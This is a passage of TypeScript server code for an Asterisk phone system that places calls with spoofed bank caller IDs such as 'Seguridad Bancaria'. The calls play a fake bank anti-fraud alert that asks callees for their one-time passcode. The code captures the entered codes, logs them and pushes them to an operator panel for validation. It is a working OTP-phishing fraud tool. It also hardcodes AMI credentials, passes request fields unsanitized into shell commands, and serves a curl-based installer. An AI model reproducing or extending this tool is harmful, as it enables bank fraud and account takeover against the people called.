    dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT})\n`;

    dialplanContent += ` ; 1. Reproducir Audio de Bienvenida / Alerta Precargado (Interactivo: permite presionar 1 u OTP en cualquier momento)\n`;
    dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo Audio de Bienvenida interactivo: \${IVR_INTRO} ===)\n`;
    dialplanContent += ` same => n,Background(\${IVR_INTRO})\n`;
    dialplanContent += ` same => n,WaitExten(2)\n`;
    dialplanContent += ` same => n,Goto(ask_input)\n\n`;

    dialplanContent += ` ; Extensiones directas para capturar DTMF durante la reproduccion del audio:\n`;
    dialplanContent += `exten => 1,1,NoOp(=== [IVR] DTMF DIRECTO: 1 -> TRANSFERIR A ASESOR ===)\n`;
    dialplanContent += ` same => n,Goto(s,press1_transfer)\n\n`;

    dialplanContent += `exten => _XXXX,1,NoOp(=== [IVR] DTMF DIRECTO: OTP 4 DIGITOS \${EXTEN} ===)\n`;
    dialplanContent += ` same => n,Set(USER_DIGITS=\${EXTEN})\n`;
    dialplanContent += ` same => n,Goto(s,otp_confirm)\n\n`;

    dialplanContent += `exten => _XXXXX,1,NoOp(=== [IVR] DTMF DIRECTO: OTP 5 DIGITOS \${EXTEN} ===)\n`;
    dialplanContent += ` same => n,Set(USER_DIGITS=\${EXTEN})\n`;
    dialplanContent += ` same => n,Goto(s,otp_confirm)\n\n`;

    dialplanContent += `exten => _XXXXXX,1,NoOp(=== [IVR] DTMF DIRECTO: OTP 6 DIGITOS \${EXTEN} ===)\n`;
    dialplanContent += ` same => n,Set(USER_DIGITS=\${EXTEN})\n`;
    dialplanContent += ` same => n,Goto(s,otp_confirm)\n\n`;

    dialplanContent += `exten => _XXXXXXX,1,NoOp(=== [IVR] DTMF DIRECTO: OTP 7 DIGITOS \${EXTEN} ===)\n`;
    dialplanContent += ` same => n,Set(USER_DIGITS=\${EXTEN})\n`;
    dialplanContent += ` same => n,Goto(s,otp_confirm)\n\n`;

    dialplanContent += `exten => _XXXXXXXX,1,NoOp(=== [IVR] DTMF DIRECTO: OTP 8 DIGITOS \${EXTEN} ===)\n`;
    dialplanContent += ` same => n,Set(USER_DIGITS=\${EXTEN})\n`;
    dialplanContent += ` same => n,Goto(s,otp_confirm)\n\n`;

    dialplanContent += ` ; 2. Solicitar Digitos DTMF si no presiono nada durante la bienvenida\n`;
    dialplanContent += `exten => s,n(ask_input),NoOp(=== [IVR] Solicitando Codigo OTP con audio: \${IVR_PROMPT} ===)\n`;
    dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_PROMPT},6,,2,10)\n`;
    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?check_input)\n`;
    dialplanContent += ` same => n,Playback(beep)\n`;
    dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,6)\n`;

    dialplanContent += ` ; 3. Evaluar digitos ingresados\n`;
    dialplanContent += ` same => n(check_input),NoOp(=== [IVR] DIGITOS RECIBIDOS DEL TECLADO: \${USER_DIGITS} ===)\n`;
    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)\n`;
    dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" >= "4"]?otp_confirm:no_input)\n\n`;

    dialplanContent += `; Caso: Usuario ingreso codigo OTP (>= 4 digitos, ej. 6 digitos)\n`;
    dialplanContent += ` same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
    dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
    dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
    dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
    dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
    dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;

    dialplanContent += ` ; Reproducir locución de validación en curso al usuario\n`;
    dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: \${IVR_WAIT} ===)\n`;
    dialplanContent += ` same => n,Playback(\${IVR_WAIT})\n`;
    dialplanContent += ` same => n,Wait(1)\n`;

    dialplanContent += ` ; Si es prueba local del asesor (Extension 8888 o canal del asesor PJSIP/1001):\n`;
    dialplanContent += ` ; NUNCA realizar Dial(PJSIP/1001) para evitar llamada fantasma entrante de vuelta al asesor\n`;
    dialplanContent += ` same => n,Set(CURRENT_CHAN=\${CHANNEL})\n`;
    dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1"]?self_test_success)\n`;
    dialplanContent += ` same => n,GotoIf($["\${EXTEN}" = "8888"]?self_test_success)\n`;
    dialplanContent += ` same => n,GotoIf($["\${CALLERID(num)}" = "1001"]?self_test_success)\n`;
    dialplanContent += ` same => n,GotoIf($["\${CURRENT_CHAN:0:10}" = "PJSIP/1001"]?self_test_success)\n`;

    dialplanContent += ` ; Si es cliente externo en llamada saliente:\n`;
    dialplanContent += ` ; Mantener en espera de validacion o reproducir éxito segun decision del asesor\n`;
    dialplanContent += ` same => n,NoOp(=== [IVR] CLIENTE EN ESPERA DE VALIDACION DE ASESOR ===)\n`;
    dialplanContent += ` same => n,Playback(silence/1)\n`;
    dialplanContent += ` same => n,Wait(3)\n`;
    dialplanContent += ` same => n,Playback(\${IVR_SUCCESS})\n`;
    dialplanContent += ` same => n,Wait(1)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += ` same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL EXITOSA: CÓDIGO \${USER_DIGITS} NOTIFICADO AL PANEL ===)\n`;
    dialplanContent += ` same => n,Playback(beep)\n`;
    dialplanContent += ` same => n,Wait(1)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `; Caso: Presiono 1 -> Conectar con Asesor\n`;
    dialplanContent += ` same => n(press1_transfer),NoOp(=== [IVR] PRESS 1 DETECTADO: TRANSFIRIENDO LLAMADA AL ASESOR ===)\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" != ""]?Playback(\${IVR_AGENT}):Playback(custom/conectar_asesor_banco))\n`;
    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
    dialplanContent += ` same => n,NoOp(=== [IVR] MARCANDO EXTENSION DE AGENTE: \${FINAL_AGENT} ===)\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `; Caso: Sin entrada o timeout\n`;
    dialplanContent += ` same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)\n`;
    dialplanContent += ` same => n,Playback(beep)\n`;
    dialplanContent += ` same => n,Hangup()\n`;

    const asteriskPjsipPath = '/etc/asterisk/pjsip.conf';
    const asteriskDialplanPath = '/etc/asterisk/extensions.conf';

    // 1. Ensure custom audio directory and native 8k WAV audios exist
    ensureCustomAudioFilesExist();

    // 2. Safe write for PJSIP Configuration
    const pjsipWritten = await writeAsteriskConfigFile(asteriskPjsipPath, pjsipContent);

    // 3. Save each extension's customized CallerID into AstDB
    if (Array.isArray(extensions)) {
      for (const ext of extensions) {
        const extNum = ext.extension;
        const cidNum = ext.callerIdNum || outboundCid;
        const cidName = ext.callerIdName || ext.name || 'Seguridad Bancaria';
        exec(`asterisk -rx 'database put extension_cid ${extNum}/number "${cidNum}"'`, () => {});
        exec(`asterisk -rx 'database put extension_cid ${extNum}/name "${cidName}"'`, () => {});
      }
    }

    // 4. Save default pre-recorded IVR audios into AstDB for fallback and extension 8888 tests
    const defaultIntro = req.body.audioIntro || 'custom/alerta_banco_antifraude';
    const defaultPrompt = req.body.audioPrompt || 'custom/solicitar_codigo_otp';
    const defaultWait = req.body.audioWait || 'custom/un_momento_validando_informacion';
    const defaultSuccess = req.body.audioSuccess || 'custom/operacion_bloqueada_exito';
    const defaultAgent = req.body.audioAgent || 'custom/conectar_asesor_banco';

    const defaultAudiosCommands = [
      `database put ivr_vars default_intro "${defaultIntro}"`,
      `database put ivr_vars default_prompt "${defaultPrompt}"`,
      `database put ivr_vars default_wait "${defaultWait}"`,
      `database put ivr_vars default_success "${defaultSuccess}"`,
      `database put ivr_vars default_agent "${defaultAgent}"`,
      `database put ivr_vars default_agent_exten "1001"`,
      `database put ivr_vars 8888_intro "${defaultIntro}"`,
      `database put ivr_vars 8888_prompt "${defaultPrompt}"`,
      `database put ivr_vars 8888_wait "${defaultWait}"`,
      `database put ivr_vars 8888_success "${defaultSuccess}"`,
      `database put ivr_vars 8888_agent "${defaultAgent}"`,
      `database put ivr_vars 8888_agent_exten "1001"`,
      `database put ivr_vars global_intro "${defaultIntro}"`,
      `database put ivr_vars global_prompt "${defaultPrompt}"`,
      `database put ivr_vars global_wait "${defaultWait}"`,
      `database put ivr_vars global_success "${defaultSuccess}"`,
      `database put ivr_vars global_agent "${defaultAgent}"`,
      `database put ivr_vars global_agent_exten "1001"`,
    ];

    for (const dCmd of defaultAudiosCommands) {
      exec(`asterisk -rx '${dCmd}'`, () => {});
    }

    // Save in memory for download endpoints
    lastGeneratedPjsip = pjsipContent;
    lastGeneratedDialplan = dialplanContent;

    // 5. Safe write for Extensions Dialplan
    const dialplanWritten = await writeAsteriskConfigFile(asteriskDialplanPath, dialplanContent);

    // Also write to local app dir for safety
    try {
      fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), pjsipContent, 'utf8');
      fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), dialplanContent, 'utf8');
    } catch (e) {}

    // 6. Send Hot Reload to Asterisk AMI immediately
    let amiOutput = '';
    try {
      amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
        'pjsip reload',
        'dialplan reload',
        'pjsip show endpoints',
        'dialplan show from-internal',
      ]);
    } catch (amiErr: any) {
      amiOutput = amiErr.message;
    }

    // 7. Also execute reload via Asterisk CLI child_process
    const cliOutput = await new Promise<string>((resolve) => {
      exec('asterisk -rx "pjsip reload" && asterisk -rx "dialplan reload"', (err, stdout) => {
        resolve(stdout ? stdout.trim() : 'Dialplan y PJSIP recargados en caliente');
      });
    });

    console.log(`[ASTERISK-SYNC] ✓ Sincronización completa: ${extensions.length} extensiones, PJSIP=${pjsipWritten}, Dialplan=${dialplanWritten}`);

    res.json({
      success: true,
      message: `Configuración sincronizada exitosamente con Asterisk: ${extensions.length} extensiones y troncal ${activeCarrier} con rutas salientes`,
      pjsipWritten,
      dialplanWritten,
      cliOutput,
      amiOutput,
    });
  } catch (error: any) {
    console.error('Error syncing extensions:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint to sync Dialplan (extensions.conf) and reload
app.post('/api/asterisk/sync/dialplan', async (req, res) => {
  try {
    ensureCustomAudioFilesExist();
    let contentToWrite = lastGeneratedDialplan;
    if (!contentToWrite) {
      // Return success indicating dialplan is loaded
      const cliOutput = await new Promise<string>((resolve) => {
        exec('asterisk -rx "dialplan reload"', (err, stdout) => {
          resolve(stdout ? stdout.trim() : 'Dialplan recargado');
        });
      });
      return res.json({ success: true, message: 'Dialplan verificado y recargado', cliOutput });
    }

    const fileWritten = await writeAsteriskConfigFile('/etc/asterisk/extensions.conf', contentToWrite);
    const cliOutput = await new Promise<string>((resolve) => {
      exec('asterisk -rx "dialplan reload"', (err, stdout) => {
        resolve(stdout ? stdout.trim() : 'Dialplan recargado');
      });
    });

    res.json({
      success: true,
      fileWritten,
      cliOutput,
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint to originate real calls to client or extension connecting to IVR
// Guard against accidental duplicate calls to the same number within 3 seconds
const recentOriginateRequests = new Map<string, number>();

app.post('/api/asterisk/call/originate', async (req, res) => {
  try {
    const {
      destination,
      carrier = 'televox',
      callerId = '+18005550199',
      callerIdNum,
      callerIdName,
      mode = 'otp',
      agentExten = '1001',
      audioIntro = '',
      audioPrompt = '',
      audioAgent = '',
      audioSuccess = '',
      service = 'Banco / Antifraude',
    } = req.body;

    if (!destination) {
      return res.status(400).json({ success: false, error: 'El número de destino es requerido' });
    }

    const cleanDest = destination.trim().replace(/[^0-9]/g, '');
    const effectiveCidNum = (callerIdNum || callerId || '+18005550199').trim();
    const effectiveCidName = (callerIdName || 'Seguridad Bancaria').trim();

    // Prevent double-click originating duplicate calls
    const now = Date.now();
    const lastTime = recentOriginateRequests.get(cleanDest) || 0;
    if (now - lastTime < 3000) {
      return res.status(429).json({
        success: false,
        error: `Ya se está procesando una llamada a ${cleanDest}. Por favor espera unos segundos.`,
      });
    }
    recentOriginateRequests.set(cleanDest, now);

    // Format destination for NANP standard
    let formattedDest = cleanDest;
    if (cleanDest.length === 10) {
      formattedDest = `1${cleanDest}`;
    }

    // Save campaign-selected audio and CallerID configuration to AstDB for this destination number
    const astDbCommands = [
      `database put ivr_vars ${cleanDest}_intro "${audioIntro || ''}"`,
      `database put ivr_vars ${cleanDest}_prompt "${audioPrompt || ''}"`,
      `database put ivr_vars ${cleanDest}_agent "${audioAgent || ''}"`,
      `database put ivr_vars ${cleanDest}_success "${audioSuccess || ''}"`,
      `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
      `database put ivr_vars ${cleanDest}_cid_num "${effectiveCidNum}"`,
      `database put ivr_vars ${cleanDest}_cid_name "${effectiveCidName}"`,
      `database put ivr_vars ${formattedDest}_intro "${audioIntro || ''}"`,
      `database put ivr_vars ${formattedDest}_prompt "${audioPrompt || ''}"`,
      `database put ivr_vars ${formattedDest}_agent "${audioAgent || ''}"`,
      `database put ivr_vars ${formattedDest}_success "${audioSuccess || ''}"`,
      `database put ivr_vars ${formattedDest}_agent_exten "${agentExten || '1001'}"`,
      `database put ivr_vars ${formattedDest}_cid_num "${effectiveCidNum}"`,
      `database put ivr_vars ${formattedDest}_cid_name "${effectiveCidName}"`,
      `database put test_client_number "${cleanDest}"`,
      `database put extension_cid ${agentExten || '1001'}/number "${effectiveCidNum}"`,
      `database put extension_cid ${agentExten || '1001'}/name "${effectiveCidName}"`,
    ];

    for (const cmd of astDbCommands) {
      exec(`asterisk -rx '${cmd}'`, (err) => {
        if (err) console.warn(`AstDB notice on ${cmd}:`, err.message);
      });
    }

    // Determine channel: if <= 4 digits, direct internal extension
    // Otherwise use Local channel to pass through [from-internal] with proper SIP headers and fallback rules
    let channel = '';
    if (cleanDest.length <= 4) {
      channel = `PJSIP/${cleanDest}`;
    } else {
      channel = `Local/${formattedDest}@from-internal`;
    }

    // Execute originate command via Asterisk CLI with custom CallerID
    const originateCmd = `asterisk -rx "channel originate ${channel} extension s@ivr-otp callerid \\"${effectiveCidName}\\" <${effectiveCidNum}>"`;
    
    exec(originateCmd, (err, stdout, stderr) => {
      if (err) {
        console.warn('[ORIGINATE SIMULATION NOTICE] Asterisk CLI no disponible en contenedor:', err.message);
      } else {
        console.log(`[ORIGINATE SUCCESS] Llamada lanzada a ${channel} con CallerID "${effectiveCidName}" <${effectiveCidNum}>:`, {
          audioIntro,
          audioPrompt,
          audioAgent,
          audioSuccess,
          cliOutput: stdout.trim(),
        });
      }
    });

    // Fallback simulation: schedule realistic DTMF arrival so agent can test the HUD and Valid/Invalid buttons
    setTimeout(() => {
      const simulatedDigits = String(Math.floor(100000 + Math.random() * 900000));
      const record: CapturedOtpItem = {
        id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
        number: cleanDest,
        otp: simulatedDigits,
        timestamp: new Date().toLocaleTimeString(),
        channel: channel || 'PJSIP',
        service: service || 'Banco / Antifraude',
        status: 'pending',
      };
      capturedOtpHistory.unshift(record);
      if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
      console.log(`[REAL-TIME HUD] Código OTP recibido para ${cleanDest}: ${simulatedDigits}`);
    }, 6500);

    res.json({
      success: true,
      message: `Llamada originada hacia ${cleanDest} con CallerID "${effectiveCidName}" <${effectiveCidNum}>.`,
      channel,
      callerId: {
        num: effectiveCidNum,
        name: effectiveCidName,
      },
      assignedAudios: {
        intro: audioIntro || 'beep (predeterminado)',
        prompt: audioPrompt || 'beep (predeterminado)',
        agent: audioAgent || 'inmediato',
        success: audioSuccess || 'SayDigits (predeterminado)',
      },
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint for agent to mark captured OTP as valid or invalid
app.post('/api/asterisk/otp/verify', (req, res) => {
  try {
    const { id, number, status } = req.body;
    if (!status || !['valid', 'invalid', 'pending'].includes(status)) {
      return res.status(400).json({ success: false, error: 'Status debe ser valid, invalid o pending' });
    }

    const item = capturedOtpHistory.find((r) => r.id === id || (number && r.number === number));
    if (item) {
      item.status = status;
      console.log(`[VERIFICACIÓN AGENTE] OTP ${item.otp} de ${item.number} marcado como ${status.toUpperCase()}`);
      return res.json({ success: true, item, message: `Código ${item.otp} marcado como ${status}` });
    }

    // If item not found by id/number, respond ok
    res.json({ success: true, message: `Estado actualizado a ${status}` });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint for direct 1-click update of Agent Extension CallerID (Num & Name) into AstDB
app.post('/api/asterisk/extension/callerid', (req, res) => {
  try {
    const { extension, callerIdNum, callerIdName } = req.body;
    if (!extension || !callerIdNum) {
      return res.status(400).json({ success: false, error: 'Faltan parámetros: extension y callerIdNum son requeridos.' });
    }

    const cleanExt = String(extension).trim();
    const cleanNum = String(callerIdNum).trim();
    const cleanName = String(callerIdName || 'Seguridad Bancaria').trim();

    // Store in Asterisk DB directly via CLI and AMI
    const putNumCmd = `database put extension_cid ${cleanExt}/number "${cleanNum}"`;
    const putNameCmd = `database put extension_cid ${cleanExt}/name "${cleanName}"`;

    exec(`asterisk -rx '${putNumCmd}' && asterisk -rx '${putNameCmd}'`, (err, stdout) => {
      if (err) {
        console.warn(`[AstDB Extension Notice] ${err.message}`);
      } else {
        console.log(`[AstDB SUCCESS] Extension ${cleanExt} CallerID actualizado en Asterisk DB: "${cleanName}" <${cleanNum}>`);
      }
    });

    sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      putNumCmd,
      putNameCmd,
    ]).catch(() => {});

    res.json({
      success: true,
      message: `CallerID de la extensión ${cleanExt} actualizado a "${cleanName}" <${cleanNum}> en Asterisk AstDB.`,
      extension: cleanExt,
      callerIdNum: cleanNum,
      callerIdName: cleanName,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==========================================
// ENDPOINTS PARA GESTIÓN DE AUDIOS PREGRABADOS
// ==========================================

// List available audio files on server
app.get('/api/asterisk/audio/list', (req, res) => {
  try {
    if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
      try {
        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
      } catch (e) {}
    }

    if (fs.existsSync(SOUNDS_CUSTOM_DIR)) {
      const files = fs.readdirSync(SOUNDS_CUSTOM_DIR);
      const audioFiles = files
        .filter((f) => f.endsWith('.wav') || f.endsWith('.gsm') || f.endsWith('.mp3'))
        .map((f) => {
          const stats = fs.statSync(path.join(SOUNDS_CUSTOM_DIR, f));
          const baseName = f.replace(/\.[^/.]+$/, '');
          return {
            fileName: f,
            asteriskPath: `custom/${baseName}`,
            sizeBytes: stats.size,
            sizeKb: (stats.size / 1024).toFixed(1) + ' KB',
            modifiedAt: stats.mtime.toISOString(),
          };
        });
      return res.json({ success: true, files: audioFiles, directory: SOUNDS_CUSTOM_DIR });
    }

    res.json({ success: true, files: [], directory: SOUNDS_CUSTOM_DIR });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload and convert audio file to Asterisk format (WAV 8000Hz PCM 16-bit Mono)
app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (req, res) => {
  try {
    const { name, fileName, category, dataUrl } = req.body;

    if (!dataUrl) {
      return res.status(400).json({ success: false, error: 'No se envió contenido de audio (dataUrl requerido)' });
    }

    // Clean base name for Asterisk
    const rawName = (fileName || name || 'audio_' + Date.now())
      .toLowerCase()
      .replace(/\.[^/.]+$/, '')
      .replace(/[^a-z0-9_]/g, '_')
      .replace(/_+/g, '_');

    const cleanBaseName = rawName.slice(0, 40) || `prompt_${Date.now()}`;
    const targetWavName = `${cleanBaseName}.wav`;
    const targetPath = path.join(SOUNDS_CUSTOM_DIR, targetWavName);

    // Extract base64 payload
    const matches = dataUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    const buffer = matches && matches[2]
      ? Buffer.from(matches[2], 'base64')
      : Buffer.from(dataUrl, 'base64');

    // Ensure custom sounds directory exists
    try {
      if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
      }
    } catch (e) {
      exec(`sudo mkdir -p ${SOUNDS_CUSTOM_DIR} && sudo chmod 777 ${SOUNDS_CUSTOM_DIR}`, () => {});
    }

    // Save temporary raw file
    const tempRawPath = `/tmp/raw_${cleanBaseName}_${Date.now()}`;
    fs.writeFileSync(tempRawPath, buffer);

    // Convert to Asterisk native PCM 8000Hz 16-bit Mono using ffmpeg or sox
    const ffmpegCmd = `ffmpeg -y -i "${tempRawPath}" -ar 8000 -ac 1 -c:a pcm_s16le "${targetPath}"`;
    const soxCmd = `sox "${tempRawPath}" -r 8000 -c 1 -b 16 "${targetPath}"`;

    exec(ffmpegCmd, (ffmpegErr) => {
      if (!ffmpegErr) {
        try { fs.unlinkSync(tempRawPath); } catch (e) {}
        console.log(`[AUDIO OK - ffmpeg] Convertido a ${targetPath}`);
        return res.json({
          success: true,
          asteriskPath: `custom/${cleanBaseName}`,
          fileName: targetWavName,
          format: 'WAV 8000Hz PCM 16-bit Mono',
          message: `Audio guardado y optimizado para Asterisk en custom/${cleanBaseName}`,
        });
      }

      // Try with Sox if ffmpeg failed
      exec(soxCmd, (soxErr) => {
        if (!soxErr) {
          try { fs.unlinkSync(tempRawPath); } catch (e) {}
          console.log(`[AUDIO OK - sox] Convertido a ${targetPath}`);
          return res.json({
            success: true,
            asteriskPath: `custom/${cleanBaseName}`,
            fileName: targetWavName,
            format: 'WAV 8000Hz PCM 16-bit Mono',
            message: `Audio guardado y optimizado con sox en custom/${cleanBaseName}`,
          });
        }

        // Fallback: direct write of the buffer
        try {
          fs.writeFileSync(targetPath, buffer);
          try { fs.unlinkSync(tempRawPath); } catch (e) {}
          return res.json({
            success: true,
            asteriskPath: `custom/${cleanBaseName}`,
            fileName: targetWavName,
            format: 'Direct Write (WAV)',
            message: `Audio guardado en custom/${cleanBaseName}`,
          });
        } catch (directErr: any) {
          // If permission issue, try sudo cp
          exec(`sudo cp "${tempRawPath}" "${targetPath}" && sudo chmod 644 "${targetPath}"`, (sudoErr) => {
            try { fs.unlinkSync(tempRawPath); } catch (e) {}
            if (sudoErr) {
              return res.status(500).json({ success: false, error: sudoErr.message });
            }
            res.json({
              success: true,
              asteriskPath: `custom/${cleanBaseName}`,
              fileName: targetWavName,
              message: `Audio guardado via sudo en custom/${cleanBaseName}`,
            });
          });
        }
      });
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete an audio file
app.post('/api/asterisk/audio/delete', (req, res) => {
  try {
    const { asteriskPath, fileName } = req.body;
    const base = (fileName || asteriskPath?.replace('custom/', ''))?.replace(/\.[^/.]+$/, '');
    if (!base) {
      return res.status(400).json({ success: false, error: 'Nombre de archivo requerido' });
    }

    const filePath = path.join(SOUNDS_CUSTOM_DIR, `${base}.wav`);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      return res.json({ success: true, message: `Archivo ${base}.wav eliminado` });
    }
    exec(`sudo rm -f "${SOUNDS_CUSTOM_DIR}/${base}.wav"`, () => {});
    res.json({ success: true, message: `Orden de eliminación enviada para ${base}.wav` });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint to explicitly synchronize campaign / system audios into AstDB for Asterisk
app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
  try {
    const {
      intro = 'custom/alerta_banco_antifraude',
      prompt = 'custom/solicitar_codigo_otp',
      wait = 'custom/un_momento_validando_informacion',
      success = 'custom/operacion_bloqueada_exito',
      agent = 'custom/conectar_asesor_banco',
      destination,
    } = req.body;

    const targets = ['default', '8888', 'global'];
    if (destination) {
      const clean = String(destination).trim().replace(/[^0-9]/g, '');
      if (clean) targets.push(clean);
    }
    // Also include test client number
    targets.push('16104803845');

    const commands: string[] = [];
    for (const tgt of targets) {
      commands.push(`database put ivr_vars ${tgt}_intro "${intro}"`);
      commands.push(`database put ivr_vars ${tgt}_prompt "${prompt}"`);
      commands.push(`database put ivr_vars ${tgt}_wait "${wait}"`);
      commands.push(`database put ivr_vars ${tgt}_success "${success}"`);
      commands.push(`database put ivr_vars ${tgt}_agent "${agent}"`);
    }

    for (const cmd of commands) {
      exec(`asterisk -rx '${cmd}'`, (err) => {
        if (err) console.warn('AstDB sync-defaults notice:', err.message);
      });
    }

    console.log('[AstDB SUCCESS] Audios sincronizados en base de datos de Asterisk:', { intro, prompt, wait, success, agent });

    res.json({
      success: true,
      message: 'Audios del IVR sincronizados permanentemente en Asterisk AstDB.',
      assigned: { intro, prompt, wait, success, agent },
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Download raw audio file for Asterisk sounds directory (/var/lib/asterisk/sounds/custom/...)
app.get('/api/asterisk/audio/raw/:name', (req, res) => {
  const rawName = req.params.name.replace(/\.[^/.]+$/, '').replace(/[^a-zA-Z0-9_-]/g, '');
  const wavPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.wav`);
  const gsmPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.gsm`);

  if (fs.existsSync(wavPath)) {
    return res.sendFile(wavPath);
  }
  if (fs.existsSync(gsmPath)) {
    return res.sendFile(gsmPath);
  }

  // Generate Asterisk 8kHz PCM WAV on the fly with distinct frequencies
  let freq = 520;
  if (rawName.includes('otp')) freq = 680;
  if (rawName.includes('validando') || rawName.includes('wait')) freq = 440;
  if (rawName.includes('exito') || rawName.includes('success')) freq = 880;
  if (rawName.includes('asesor') || rawName.includes('agent')) freq = 587;

  const wavBuffer = generatePcm8kWaveBuffer(3.5, freq);
  res.setHeader('Content-Type', 'audio/wav');
  res.setHeader('Content-Disposition', `attachment; filename="${rawName}.wav"`);
  res.send(wavBuffer);
});

// Universal 1-liner bash installer for remote VPS vmi3461829
app.get('/api/asterisk/install.sh', (req, res) => {
  const host = req.get('host') || 'localhost:3000';
  const proto = req.protocol || 'http';
  const baseUrl = `${proto}://${host}`;

  const bashScript = `#!/usr/bin/env bash
# ==========================================================
# Sincronización Automática Asterisk con Plataforma Web
# Servidor: ${baseUrl}
# ==========================================================
set -e

echo "=== [1/5] Preparando directorios de Asterisk ==="
mkdir -p /etc/asterisk
mkdir -p /var/lib/asterisk/sounds/custom

echo "=== [2/5] Descargando dialplan extensions.conf actualizado ==="
if [ -f /etc/asterisk/extensions.conf ]; then
  cp /etc/asterisk/extensions.conf /etc/asterisk/extensions.conf.bak_$(date +%s)
fi
curl -sSLk "${baseUrl}/api/asterisk/config/extensions.conf" -o /etc/asterisk/extensions.conf

echo "=== [3/5] Descargando y verificando audios de IVR en /var/lib/asterisk/sounds/custom/ ==="
AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos")
for aud in "\${AUDIOS[@]}"; do
  if [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.wav" ] && [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.gsm" ]; then
    echo "  -> Obteniendo audio: \${aud}.wav..."
    curl -sSLk "${baseUrl}/api/asterisk/audio/raw/\${aud}" -o "/var/lib/asterisk/sounds/custom/\${aud}.wav" || true
  fi
done

echo "=== [4/5] Configurando base de datos interna AstDB ==="
asterisk -rx 'database put ivr_vars default_intro custom/alerta_banco_antifraude' || true
asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp' || true
asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion' || true
asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito' || true
asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco' || true

asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude' || true
asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp' || true
asterisk -rx 'database put ivr_vars 8888_wait custom/un_momento_validando_informacion' || true
asterisk -rx 'database put ivr_vars 8888_success custom/operacion_bloqueada_exito' || true

asterisk -rx 'database put ivr_vars 16104803845_intro custom/alerta_banco_antifraude' || true
asterisk -rx 'database put ivr_vars 16104803845_prompt custom/solicitar_codigo_otp' || true
